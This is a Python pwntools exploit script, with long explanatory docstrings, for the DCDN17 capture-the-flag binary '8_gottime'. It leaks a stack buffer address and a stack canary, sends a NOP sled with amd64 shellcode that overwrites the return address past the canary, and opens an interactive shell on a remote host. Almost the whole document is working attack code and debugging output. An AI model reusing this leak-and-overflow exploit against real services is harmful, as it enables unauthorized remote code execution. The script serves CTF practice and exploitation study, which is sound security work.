#!/usr/bin/python

"""
Exploit for 8_gottime from DCDN17
By: 0tt3r

Requires pwntools to be installed and working

https://github.com/Gallopsled/pwntools

"""

from pwn import *
import argparse
import sys
import os


def getBuffAddress(pipe, depth=24, printRaw = False):
	"""
	Takes a process pipe and gets the address of the buffer
	Located at 16 bytes, and grab extra 8 for the 64 bit address
	
	First run against the actual remote system failed
	set depth to grab more data
	set printRaw to True to get a repr print of buffer for visibility
	
	The exploit running on my local system and the server running on the remote system
	deliver different memory structures for the uninitialized buf.
	
	I have hashed the binary I worked on back in August and the current one provided by
	the Daemon, and they are the same.
	
	This implies a different operating system.  Nmap on the gibson box is unable to determine
	the operating system.
	
	But we know the stack is always among the highest memory values in a system.
	
	If we do a memory grab against the local binary, we get something like this:
	[+] Starting local process './8_gotime': pid 3435
	[i] Grabbing buffer location
	[i] Buffer address at 0 byte offset: 0x7f664d991400
	[i] Buffer address at 8 byte offset: 0x7f664df41470
	[i] Buffer address at 16 byte offset: 0x7ffcb16c04f0 <----- THIS IS ACTUAL BUF LOCATION
	[i] Buffer address at 24 byte offset: -0x50
	[i] Buffer address at 32 byte offset: 0x7f664df456b8
	[i] Buffer address at 40 byte offset: 0x7ffcb16c04e0 <----- THIS WOULD HAVE BEEN CLOSE TOO
	[i] Buffer address at 48 byte offset: 0x7f664dae2257
	
	If I do it against the remote system I get examples results like this:
	[+] Opening connection to gibson.systems on port 32132: Done
	[i] Grabbing buffer location
	[i] Buffer address at 0 byte offset: 0x7fffdf5afba0 <------ POSSIBLE?
	[i] Buffer address at 8 byte offset: 0x7f95657b49c0
	[i] Buffer address at 16 byte offset: -0x4f
	[i] Buffer address at 24 byte offset: 0x7f95657b74d0
	[i] Buffer address at 32 byte offset: 0x7f95657b7178
	[i] Buffer address at 40 byte offset: 0x7f956559dae1
	[i] Buffer address at 48 byte offset: -0x50
	[i] Buffer address at 56 byte offset: 0x7f95657b49c0
	[i] Buffer address at 64 byte offset: -0x4f
	[i] Buffer address at 72 byte offset: -0x50
	[i] Buffer address at 80 byte offset: 0x7ffeffffffb1 <----- This value never changes
	
	
	But, in my tests on local binary, the data in the buffer I chose was always 80 bytes
	higher than the actual buffer address.  Does that maintain in the remote system?  I would
	guess probably not.  So, instead of the 80 bytes, I'm going to add a NOP sled at the front
	of the shellcode and see if the local exploit still works.  The sled will be as large as
	possible.
	
	The NOP sled was capped at 208 for some reason, but using the raw value from the buffer and
	a 208 byte NOP sled, the local exploit still works.  Time to test against remote.
	
	I speculate the value at offset 0 is a valid buffer location.  Let's see.
	
	Inconclusive results here.  It doesn't seem as though I'm crashing the remote binary because
	the pipe stays open, no matter what ret value I send.
	
	Digging deeper into the local binary
	
	Possible useful address located at 272 bytes from top of buf, seems to be 432 bytes
	from good landing in buffer, consistently
	
	Deep buffer scrape (local):

	[i] Buffer address at 272 byte offset: 0x7ffccb5e0c20	
	[i] Buffer address at 312 byte offset: 0x7ffccb5e0c28	
	[i] Buffer address at 360 byte offset: 0x7ffccb5e0c20
	[i] Buffer address at 472 byte offset: 0x7ffccb5e0c20

	Deep buffer scrape (remote):
	
	[i] Buffer address at 272 byte offset: 0x7ffffcc8dbc0
	[i] Buffer address at 312 byte offset: 0x7ffffcc8dbc8
	[i] Buffer address at 360 byte offset: 0x7ffffcc8dbc0
	[i] Buffer address at 472 byte offset: 0x7ffffcc8dbc0
	
	Looks promising.

	Lets try the 272 (+8 for the data) offset, with 432 byte subtraction to put me in
	NOP sled on local.  Worked!
	
	Try remote...  BOOM!  BOOM!  BOOM!

	"""
	print "[i] Grabbing buffer location"
	activate_print = '\x01'
	exploit = activate_print + p32(depth)
	pipe.send(exploit)
	data = pipe.recv(depth)
	if (printRaw):
		#print "[i] Raw bytes recvd: {}".format(repr(data))
		for i in range(0, len(data), 8):
			address = struct.unpack("<q", data[i:i+8])[0]
			print "[i] Buffer address at {} byte offset: {}".format(i, hex(address))
	
	#Original exploit counts on exact knowledge of buffer.  But, that seems to fail at remote
	#address = struct.unpack("<q", data[-8:])[0] - 80
	address = struct.unpack("<q", data[-8:])[0] - 432
	
	print "[i] Buffer address: {}".format(hex(address))
	return address
	
def getCanary(pipe):
	"""
	Takes a process pipe and gets the value of the canary
	Located at 8 bytes, and grab extra 4 for the unsigned int value
	
	This appears to still work correctly on the remote system
	"""
	print "[i] Grabbing canary value"
	activate_print = '\x01'
	exploit = activate_print + p32(272)
	pipe.send(exploit)
	data = pipe.recv(272)
	address = struct.unpack("<i", data[-4:])[0]
	print "[i] Canary: {}".format(hex(address))
	return address
	
	
def setupPipe():
	"""
	This returns a comm pipe
	"""
	
	# This pipe set up for local execution
	#pipe = process("./8_gotime")
	#pipe = remote("127.0.0.1", 31337)
	
	# This pipe can be used for remote connection
	#Host: exploitables.dcdark.net Port: 43110(0/1)
	pipe = remote("gibson.systems", 32132)
	
	return pipe


def interact_shell(pipe):
	time.sleep(.5)
	pipe.sendline("id")
	pipe.interactive()	

def sendData(data, pipe):
	"""
	Generic senddata for this gotime protocol
	"""
	activate_load = '\x02'
	tosend = activate_load+p32(len(data))
	pipe.send(tosend)
	pipe.send(data)
	
def getData(numbytes, pipe):
	activate_print = '\x01'
	tosend = activate_print + p32(numbytes)
	pipe.send(tosend)
	data = pipe.recv(numbytes)
	return data
	
def lifecheck(pipe):
	msg = "I'm alive!!"
	sendData(msg, pipe)
	resp = getData(len(msg), pipe)
	print "[i] lifecheck response: {}".format(resp)
	return	

def exploit():
	"""
	The key to this exploit is getting the code to execute the return statement after the 
	canary check:
	
	if (canary != canarycpy)
    		exit(0);
  	return 0;
	
	You can't overflow the calls to ctf_readsn because it passes the address of buf by 
	reference.  The data that is read is never stored in the new stack frame when ctf_readsn
	is called.
	
	In order to exploit, you need the address of buf and the value of the canary.  Luckily 
	the buf is not initialized upon start.
	
	Using memory inspection during a debug session you can see a stack address of some kind 
	located 16 bytes after the start of buf.  After a few experiments it becomes apparent 
	that this address is 80 bytes away from the start of buf.  Every time.  
	
	**** PLEASE SEE NEW, LABORIOUS WRITE UP IN getBufferAddress FOR COMPLEXITY OF REMOTE SYSTEM
	
	We can use ctf_writesn to leak this address.
	
	The canary is also stored after the buf, and since we can tell the system to give us as
	much data as we want we can also grab the canary
	
	You can determine the location of the canary relative to the start of buf through
	experimentation, or you can have the disassembler help you.  At the top of sym.main
	in my disassembler (I use radare2) there is this info:
	   
	; var int local_130h @ rbp-0x130
	; var int local_120h @ rbp-0x120                                                         
	; var int local_14h @ rbp-0x14
	
	We know the stack is built from bottom up and the code shows the order of declaration:
	
	unsigned int canary;
  	char buf[256];
  	char cmd[8];
  	
  	So local_14h is the canary and local_120h is the buf.  That's actually rsp-0x14 and
  	rsp-0x120.  The difference between 0x120 and 0x14 is 268 bytes.  This is the location of
  	the canary, and where we need to put it back on overflow in order to trigger the return
  	
  	Next we need to find the stack location that holds the address that will be called on
  	the final ret.  This can be found by putting a break at that location, activating the
  	call, and checking the location of rsp.  It turns out to be a location 24 bytes after
  	the canary.
  	
  	Last thing we need is just the comm protocol.  We can activate the various functions 
  	by feeding the binary control codes that start with \x01 (write to stdout), 
  	\x02 (read from stdin) , or \x03 (exit)
  	
  	Each control code must be 5 bytes long.  Byte[0] is the command, Bytes[1-4] are the
  	little-endian packed unsigned int that tells the binary how much data to work with
  	   
  	So the exploit looks like this:
  		1) Leak the buffer address
	  	2) Leak the canary
	  	3) Generate and send evil buffer with:
	  		268 bytes shellcode and fill + canary + 24 bytes fill + buffer address
	  	4) Activate the exit function
	  	5) Enjoy shell access
	  	
	{key: available as "flag" file once you have access}
	  		  	
	"""
	pipe = setupPipe()
	activate_print = '\x01'
	activate_load = '\x02'
	activate_quit = '\x03'
	
	# this line is here to pause execution and give time to attach a debugger.
	raw_input("[!] Press Enter..")
		
	# You could grab the buffer address and canary at the same time, of course
	# buffaddr = getBuffAddress(pipe) 24 bytes is for local exploit (on a Kali box)
	# See discussions above for reason why I changed to 280 byte read.
	buffaddr = getBuffAddress(pipe, 280)
	canary = getCanary(pipe)
	
	# Built in pwntools awesomeness:
	context.update(arch='amd64')
	shellcode = asm(shellcraft.amd64.linux.sh())
	nop = asm('NOP')
	
	# New evil, big NOP sled into the shellcode
	# Getting interesting failures with a NOP sled 220 bytes long..  So played with various NOP
	# sled lengths to see how long I could go
	# 208 is max sled.  No idea why.  But if I put 209 nops it fails.
	evil = (208)*nop + shellcode
	evil = evil + 'A'*(268 - len(evil))
	#evil = shellcode + 'A'*(268 - len(shellcode))
	#print "[d] Length of evil: {}".format(len(evil))	
	#print "[d] evil: {}".format(repr(evil))
	
	evil += p32(canary) + 'B'*24
	evil += p64(buffaddr)
	
	print "[i] Sending activate load memory"
	exploit = activate_load+p32(len(evil)) 
	pipe.send(exploit)
	#raw_input("Press Enter..")
	print "[i] Sending exploit"
	pipe.send(evil)
	print "[i] Exploit sent"
	
	# Another debugger program pause
	raw_input("Press Enter..")
	
	#lifecheck(pipe)
	
	print "[i] Sending exit to get that last, critical ret"
	exploit = activate_quit + "AAAA"
	pipe.send(exploit)
	raw_input("Press Enter..")
		
	interact_shell(pipe)
	#lifecheck(pipe)

def test():
	pipe = setupPipe()
		
	# this line is here to pause execution and give time to attach a debugger.
	#raw_input("[!] Press Enter..")
	buffaddr = getBuffAddress(pipe, 600, True)
	
	
def fuzz():
	"""
	This stuff kept here to show some of the sausage making
	The writeup above is crisp, the process to get there wasn't
	"""
	
	pipe = setupPipe()
	#gdb.attach("tyro_rop1")
	# not really needed, but it will get us to the entry line
	raw_input("Press Enter..")
	
	getBuffAddress(pipe)
	getCanary(pipe)
	#exit()
	
	activate_print = '\x01'
	activate_load = '\x02'
	activate_quit = '\x03'
	"""
	for sz in range(100, 11000, 1000):
		pipe = setupPipe()
		print "[i] size: {}".format(sz)
		#raw_input("Press Enter..")
		exploit = activate_load+p32(sz)
		#print "[i] exploit: {}".format(repr(exploit))
		pipe.send(exploit)
		pipe.send(cyclic(sz))
		if (pipe.poll() != None):
			print "Process exited"
		else:
			print "Process survived"
			pipe.kill()
		
		
	
	"""
	# First write some bytes to locate the buffer
	#exploit = activate_load+p32(5) # 5 bytes
	#print "[i] exploit: {}".format(repr(exploit))
	#print "[i] Printing memory"
	#exploit = activate_print + p32(5)
	#pipe.send(exploit)
	#print pipe.recv(5)
	print "[i] Sending activate load memory"
	exploit = activate_load+p32(256) # 5 bytes
	pipe.send(exploit)
	#raw_input("Press Enter..")
	print "[i] Sending cyclic egg"
	pipe.send(cyclic(256))
	print "[i] Egg sent"
	raw_input("Press Enter..")
	#getBuffAddress(pipe)
	print "[i] Printing memory"
	exploit = activate_print + p32(256)
	pipe.send(exploit)
	print pipe.recv(256)
	print "[i] ending process"
	exploit = activate_quit + "AAAA"
	pipe.send(exploit)
	raw_input("Press Enter..")
	
	#raw_input("Press Enter..")
	
	
def main():
	
	#test()
	exploit()
	#fuzz()

main()
	 
